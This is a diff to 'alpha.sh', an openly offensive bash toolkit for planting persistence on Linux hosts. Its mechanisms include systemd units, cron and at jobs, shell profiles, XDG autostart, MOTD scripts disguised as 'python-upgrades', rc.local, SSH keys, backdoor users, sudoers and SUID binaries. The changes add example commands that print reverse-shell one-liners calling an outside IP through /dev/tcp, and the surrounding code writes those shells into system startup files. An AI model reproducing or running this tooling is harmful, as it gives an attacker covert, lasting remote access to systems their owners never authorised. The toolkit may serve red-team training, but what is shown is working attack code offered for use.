@@ -43,8 +43,8 @@ usage_user() {
 	echo "  --authorized-keys     Authorized keys management"
 	echo "  --bind-shell          Setup a bind shell"
 	echo "  --git                 Setup Git persistence"
-	echo "  --revert		      Revert most changes made by ALPHA"
-	echo "  --quiet (-q) 		  Quiet mode (no banner)"
+	echo "  --revert              Revert most changes made by ALPHA"
+	echo "  --quiet (-q)          Quiet mode (no banner)"
 }
 
 usage_root() {
@@ -65,7 +65,7 @@ usage_root() {
 	echo "  --sudoers             Set up sudoers backdoor"
 	echo "  --suid                Set up SUID backdoor"
 	echo "  --cap                 Set up capabilities backdoor"
-	echo "  --motd                Set up MOTD backdoor"
+	echo "  --motd                Set up MOTD backdoor (not available on RHEL derivatives)"
 	echo "  --rc-local            Set up rc.local backdoor"
 	echo "  --initd               Set up init.d backdoor"
 	echo "  --package-manager     Set up Package Manager persistence"
@@ -76,7 +76,7 @@ usage_root() {
 	echo "  --docker-container    Set up a malicious Docker container"
 	echo "  --malicious-package   Set up a malicious package"
 	echo "  --revert		      Revert most changes made by ALPHA"
-	echo "  --quiet (-q) 		  Quiet mode (no banner)"
+	echo "  --quiet (-q)          Quiet mode (no banner)"
 	echo ""
 }
 
@@ -92,6 +92,7 @@ setup_systemd() {
 
 	usage_systemd() {
 		echo "Usage: ./alpha.sh --systemd [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default systemd settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -131,6 +132,15 @@ setup_systemd() {
 			--port )
 				shift
 				port=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --systemd --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
+				exit 0
 				;;
 			--help|-h)
 				usage_systemd
@@ -310,11 +320,10 @@ setup_systemd() {
 		exit 1
 	fi
 
-	echo "[+] Persistence established."
+	echo "[+] Systemd service persistence established!"
 }
 
 setup_generator_persistence() {
-	local default=0
 	local ip=""
 	local port=""
 
@@ -325,16 +334,13 @@ setup_generator_persistence() {
 
 	usage_generator() {
 		echo "Usage: ./alpha.sh --generator [OPTIONS]"
-		echo "--default                    Use default systemd generator settings"
-		echo "  --ip <ip>                    Specify IP address"
-		echo "  --port <port>                Specify port number"
+		echo "--examples                   Display command examples"
+		echo "--ip <ip>                    Specify IP address"
+		echo "--port <port>                Specify port number"
 	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
-			--default )
-				default=1
-				;;
 			--ip )
 				shift
 				ip=$1
@@ -342,6 +348,11 @@ setup_generator_persistence() {
 			--port )
 				shift
 				port=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "./alpha.sh --generator --ip 10.10.10.10 --port 1337"
+				exit 0
 				;;
 			--help|-h)
 				usage_generator
@@ -354,12 +365,6 @@ setup_generator_persistence() {
 		esac
 		shift
 	done
-
-	if [[ $default -eq 0 ]]; then
-		echo "Error: --default must be specified."
-		echo "Try './alpha.sh --generator --help' for more information."
-		exit 1
-	fi
 
 	if [[ -z $ip || -z $port ]]; then
 		echo "Error: --ip and --port must be specified."
@@ -405,7 +410,7 @@ setup_generator_persistence() {
 	systemctl daemon-reload
 	systemctl enable generator
 
-	echo "[+] System-generator has been successfully planted for persistence."
+	echo "[+] Systemd Generator persistence established!"
 }
 
 setup_cron() {
@@ -418,10 +423,16 @@ setup_cron() {
 	local name=""
 	local option=""
 
+	if ! command -v crontab &> /dev/null; then
+		echo "Error: 'crontab' binary is not present. Please install 'cron' to use this mechanism."
+		exit 1
+	fi
+
 	usage_cron() {
 		if check_root; then
 			echo "Usage: ./alpha.sh --cron [OPTIONS]"
 			echo "Root User Options:"
+			echo "--examples                   Display command examples"
 			echo "--default                    Use default cron settings"
 			echo "  --ip <ip>                    Specify IP address"
 			echo "  --port <port>                Specify port number"
@@ -437,6 +448,7 @@ setup_cron() {
 		else
 			echo "Usage: ./alpha.sh --cron [OPTIONS]"
 			echo "Low Privileged User Options:"
+			echo "--examples                   Display Cron persistence examples"
 			echo "--default                    Use default systemd settings"
 			echo "  --ip <ip>                    Specify IP address"
 			echo "  --port <port>                Specify port number"
@@ -500,6 +512,22 @@ setup_cron() {
 				shift
 				name=$1
 				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --cron --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "--daily|--hourly|--monthly|--weekly:"
+				echo "sudo ./alpha.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
+				echo ""
+				echo "--crond:"
+				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
+				echo ""
+				echo "--crontab:"
+				echo "sudo ./alpha.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
+				exit 0
+				;;
 			--help|-h)
 				usage_cron
 				exit 0
@@ -533,22 +561,31 @@ setup_cron() {
 			echo "Try './alpha.sh --cron --help' for more information."
 			exit 1
 		fi
-		if [[ $cron_path != "/etc/crontab" && -z $name ]]; then
-			echo "Error: --custom requires --name for all options other than --crontab."
-			echo "Try './alpha.sh --cron --help' for more information."
-			exit 1
+		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
+			if [[ -z $name ]]; then
+				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
+				echo "Try './alpha.sh --cron --help' for more information."
+				exit 1
+			fi
+			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
+			chmod +x "$cron_path/$name"
+		elif [[ $option == "--crond" ]]; then
+			if [[ -z $name ]]; then
+				echo "Error: --custom with --crond requires --name."
+				echo "Try './alpha.sh --cron --help' for more information."
+				exit 1
+			fi
+			echo "$command" > "$cron_path/$name"
+		else
+			echo "$command" | sudo crontab -
 		fi
-		if [[ $cron_path != "/etc/crontab" ]]; then
-			cron_path="$cron_path/$name"
-		fi
-		echo "$command" > "$cron_path"
 	else
 		echo "Error: Either --default or --custom must be specified for --cron."
 		echo "Try './alpha.sh --cron --help' for more information."
 		exit 1
 	fi
 
-	echo "[+] Cron job persistence established."
+	echo "[+] Cron persistence established."
 }
 
 setup_at() {
@@ -561,6 +598,7 @@ setup_at() {
 
 	usage_at() {
 		echo "Usage: ./alpha.sh --at [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default at settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -593,6 +631,15 @@ setup_at() {
 			--time )
 				shift
 				time=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
+				exit 0
 				;;
 			--help|-h)
 				usage_at
@@ -635,7 +682,7 @@ setup_at() {
 		exit 1
 	fi
 
-	echo "[+] At job persistence established."
+	echo "[+] At job persistence established!"
 }
 
 setup_shell_profile() {
@@ -648,11 +695,12 @@ setup_shell_profile() {
 
 	usage_shell_profile() {
 		echo "Usage: ./alpha.sh --shell-profile [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default shell profile settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
 		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
-		echo "  --file <file>                Specify custom profile file"
+		echo "  --path <path>                Specify custom profile path"
 		echo "  --command <command>          Specify custom persistence command (no validation)"
 	}
 
@@ -664,7 +712,7 @@ setup_shell_profile() {
 			--custom )
 				custom=1
 				;;
-			--file )
+			--path )
 				shift
 				profile_path=$1
 				;;
@@ -679,6 +727,15 @@ setup_shell_profile() {
 			--port )
 				shift
 				port=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
+				exit 0
 				;;
 			--help|-h)
 				usage_shell_profile
@@ -713,7 +770,7 @@ setup_shell_profile() {
 		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $profile_path || -z $command ]]; then
-			echo "Error: --file and --command must be specified when using --custom."
+			echo "Error: --path and --command must be specified when using --custom."
 			echo "Try './alpha.sh --shell-profile --help' for more information."
 			exit 1
 		fi
@@ -725,7 +782,7 @@ setup_shell_profile() {
 		exit 1
 	fi
 
-	echo "[+] Shell profile persistence established."
+	echo "[+] Shell profile persistence established!"
 }
 
 setup_xdg() {
@@ -735,11 +792,12 @@ setup_xdg() {
 
 	usage_xdg() {
 		echo "Usage: ./alpha.sh --xdg [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default xdg settings"
 		echo "  --ip <ip>                  Specify IP address"
 		echo "  --port <port>              Specify port number"
 		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
-		echo "  --file <file>                Specify custom desktop entry file"
+		echo "  --path <path>                Specify custom desktop entry path"
 		echo "  --command <command>          Specify custom persistence command"
 	}
 
@@ -758,7 +816,7 @@ setup_xdg() {
 			--custom )
 				custom=1
 				;;
-			--file )
+			--path )
 				shift
 				profile_path=$1
 				;;
@@ -773,6 +831,15 @@ setup_xdg() {
 			--port )
 				shift
 				port=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --xdg --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --xdg --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/xdg/autostart/evilxdg.desktop\""
+				exit 0
 				;;
 			--help|-h)
 				usage_xdg
@@ -841,7 +908,7 @@ setup_xdg() {
 		exit 1
 	fi
 
-	echo "[+] XDG persistence established."
+	echo "[+] XDG persistence established!"
 }
 
 setup_ssh_key() {
@@ -855,12 +922,14 @@ setup_ssh_key() {
 		if check_root; then
 			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
 			echo "Root User Options:"
+			echo "--examples                   Display command examples"
 			echo "--default                    Use default SSH key settings"
 			echo "--custom                     Use custom SSH key settings"
 			echo "  --user <user>               Specify user for custom SSH key"
 		else
 			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
 			echo "Low Privileged User Options:"
+			echo "--examples                   Display command examples"
 			echo "--default                    Use default SSH key settings"
 		fi
 	}
@@ -876,6 +945,15 @@ setup_ssh_key() {
 			--user )
 				shift
 				target_user=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --ssh-key --default"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --ssh-key --custom --user victim"
+				exit 0
 				;;
 			--help|-h)
 				usage_ssh_key
@@ -945,7 +1023,7 @@ setup_ssh_key() {
 		exit 1
 	fi
 
-	echo "[+] SSH key persistence established."
+	echo "[+] SSH key persistence established!"
 }
 
 setup_authorized_keys() {
@@ -958,6 +1036,7 @@ setup_authorized_keys() {
 		if check_root; then
 			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
 			echo "Root User Options:"
+			echo "--examples                   Display command examples"
 			echo "--default                    Use default authorized keys settings"
 			echo "  --key <key>                  Specify the public key"
 			echo "--custom                     Use custom authorized keys settings"
@@ -966,6 +1045,7 @@ setup_authorized_keys() {
 		else
 			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
 			echo "Low Privileged User Options:"
+			echo "--examples                   Display command examples"
 			echo "--default                    Use default authorized keys settings"
 			echo "  --key <key>                  Specify the public key"
 		fi
@@ -986,6 +1066,15 @@ setup_authorized_keys() {
 			--path )
 				shift
 				path=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./alpha.sh --authorized-keys --default --key <public_key>"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
+				exit 0
 				;;
 			--help|-h)
 				usage_authorized_keys
@@ -1034,7 +1123,7 @@ setup_authorized_keys() {
 	echo $key >> $path
 	chmod 600 $path
 
-	echo "[+] Persistence added to $path"
+	echo "[+] Authorized_keys persistence established!"
 }
 
 setup_new_user() {
@@ -1048,6 +1137,7 @@ setup_new_user() {
 
 	usage_create_user() {
 		echo "Usage: ./alpha.sh --create-user [OPTIONS]"
+		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 		echo "--password <password>      Specify the password"
 	}
@@ -1061,6 +1151,11 @@ setup_new_user() {
 			--password )
 				shift
 				password=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "sudo ./alpha.sh --create-user --username <username> --password <password>"
+				exit 0
 				;;
 			--help|-h)
 				usage_create_user
@@ -1083,7 +1178,7 @@ setup_new_user() {
 	useradd -M $username
 	echo "$username:$password" | chpasswd
 
-	echo "[+] Persistence through the new $username user established!"
+	echo "[+] User persistence through the new $username user established!"
 }
 
 setup_backdoor_user() {
@@ -1091,6 +1186,7 @@ setup_backdoor_user() {
 
 	usage_backdoor_user() {
 		echo "Usage: ./alpha.sh --backdoor-user [OPTIONS]"
+		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 	}
 
@@ -1104,6 +1200,11 @@ setup_backdoor_user() {
 			--username )
 				shift
 				username=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "sudo ./alpha.sh --backdoor-user --username <username>"
+				exit 0
 				;;
 			--help|-h)
 				usage_backdoor_user
@@ -1131,6 +1232,7 @@ setup_backdoor_user() {
 		echo "[-] Failed to modify user $username."
 		exit 1
 	fi
+	echo "[+] Backdoor user persistence established!"
 }
 
 setup_password_change() {
@@ -1144,9 +1246,9 @@ setup_password_change() {
 
 	usage_password_change() {
 		echo "Usage: ./alpha.sh --password-change [OPTIONS]"
-		echo "--default                    Use default password change settings"
-		echo "  --username <username>        Specify the username"
-		echo "  --password <password>        Specify the new password"
+		echo "--examples                 Display command examples"
+		echo "--username <username>      Specify the username"
+		echo "--password <password>      Specify the new password"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1158,6 +1260,11 @@ setup_password_change() {
 			--password )
 				shift
 				password=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "sudo ./alpha.sh --password-change --username <username> --password <password>"
+				exit 0
 				;;
 			--help|-h)
 				usage_password_change
@@ -1201,6 +1308,7 @@ setup_passwd_user() {
 
 	usage_passwd_user() {
 		echo "Usage: ./alpha.sh --passwd-user [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default settings"
 		echo "  --username <username>        Specify the username"
 		echo "  --password <password>        Specify the password"
@@ -1227,6 +1335,15 @@ setup_passwd_user() {
 			--passwd-string )
 				shift
 				passwd_string=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --passwd-user --default --username <username> --password <password>"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
+				exit 0
 				;;
 			--help|-h)
 				usage_passwd_user
@@ -1282,6 +1399,7 @@ setup_passwd_user() {
 		echo "Try './alpha.sh --passwd-user --help' for more information."
 		exit 1
 	fi
+	echo "[+] /etc/passwd persistence established!"
 }
 
 setup_sudoers_backdoor() {
@@ -1294,6 +1412,7 @@ setup_sudoers_backdoor() {
 
 	usage_sudoers_backdoor() {
 		echo "Usage: ./alpha.sh --sudoers-backdoor [OPTIONS]"
+		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 	}
 
@@ -1302,6 +1421,11 @@ setup_sudoers_backdoor() {
 			--username )
 				shift
 				username=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "sudo ./alpha.sh --sudoers --username <username>"
+				exit 0
 				;;
 			--help|-h)
 				usage_sudoers_backdoor
@@ -1329,6 +1453,7 @@ setup_sudoers_backdoor() {
 		echo "[-] Failed to create sudoers backdoor for user $username."
 		exit 1
 	fi
+	echo "[+] Sudoers backdoor persistence established!"
 }
 
 setup_suid_backdoor() {
@@ -1343,9 +1468,10 @@ setup_suid_backdoor() {
 
 	usage_suid_backdoor() {
 		echo "Usage: ./alpha.sh --suid [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default SUID settings"
 		echo "--custom                     Use custom SUID settings"
-		echo "  --binary <binary>           Specify the binary to give SUID permissions"
+		echo "  --binary <binary>            Specify the binary to give SUID permissions"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1359,6 +1485,15 @@ setup_suid_backdoor() {
 			--binary )
 				shift
 				binary=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --suid --default"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --suid --custom --binary \"/bin/find\""
+				exit 0
 				;;
 			--help|-h)
 				usage_suid_backdoor
@@ -1423,6 +1558,7 @@ setup_suid_backdoor() {
 			echo "[-] $binary is not present on the system."
 		fi
 	fi
+	echo "[+] SUID backdoor persistence established!"
 }
 
 setup_motd_backdoor() {
@@ -1440,6 +1576,7 @@ setup_motd_backdoor() {
 
 	usage_motd_backdoor() {
 		echo "Usage: ./alpha.sh --motd [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default MOTD settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -1472,6 +1609,15 @@ setup_motd_backdoor() {
 				shift
 				path=$1
 				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --motd --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
+				exit 0
+				;;
 			--help|-h)
 				usage_motd_backdoor
 				exit 0
@@ -1502,7 +1648,7 @@ setup_motd_backdoor() {
 			echo "Try './alpha.sh --motd --help' for more information."
 			exit 1
 		fi
-
+		mkdir -p /etc/update-motd.d
 		path="/etc/update-motd.d/137-python-upgrades"
 		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
 		chmod +x $path
@@ -1516,6 +1662,7 @@ setup_motd_backdoor() {
 		fi
 
 		if [[ ! -f $path ]]; then
+			mkdir -p /etc/update-motd.d
 			echo -e "#!/bin/sh\n$command" > $path
 			chmod +x $path
 		else
@@ -1524,7 +1671,7 @@ setup_motd_backdoor() {
 			rest_of_file=$(tail -n +2 $path)
 			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
 		fi
-		echo "[+] MOTD backdoor established in $path"
+		echo "[+] MOTD backdoor persistence established!"
 	fi
 }
 
@@ -1543,6 +1690,7 @@ setup_rc_local_backdoor() {
 
 	usage_rc_local_backdoor() {
 		echo "Usage: ./alpha.sh --rc-local [OPTIONS]"
+		echo "--examples                   Display command examples"
 		echo "--default                    Use default rc.local settings"
 		echo "  --ip <ip>                    Specify IP address"
 		echo "  --port <port>                Specify port number"
@@ -1569,6 +1717,15 @@ setup_rc_local_backdoor() {
 			--command )
 				shift
 				command=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./alpha.sh --rc-local --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./alpha.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
+				exit 0
 				;;
 			--help|-h)
 				usage_rc_local_backdoor
@@ -1607,7 +1764,6 @@ setup_rc_local_backdoor() {
 			echo "[+] rc.local backdoor established"
 		else
 			echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" >> $rc_local_path
-			echo "[+] Backdoor established in existing rc.local file"
 		fi
 
 	elif [[ $custom -eq 1 ]]; then
@@ -1620,12 +1776,15 @@ setup_rc_local_backdoor() {
 		if [[ ! -f $rc_local_path ]]; then
 			echo -e "#!/bin/sh\n$command" > $rc_local_path
 			chmod +x $rc_local_path
-			echo "[+] rc.local backdoor established"
 		else
 			echo "$command" >> $rc_local_path
-			echo "[+] Backdoor established in existing rc.local file"
 		fi
 	fi
+	
+	if [ -f /etc/rc.d/rc.local ]; then
+		chmod +x /etc/rc.d/rc.local
+	fi
+	echo "[+] rc.local backdoor persistence established!"
 }
 
 setup_initd_backdoor() {
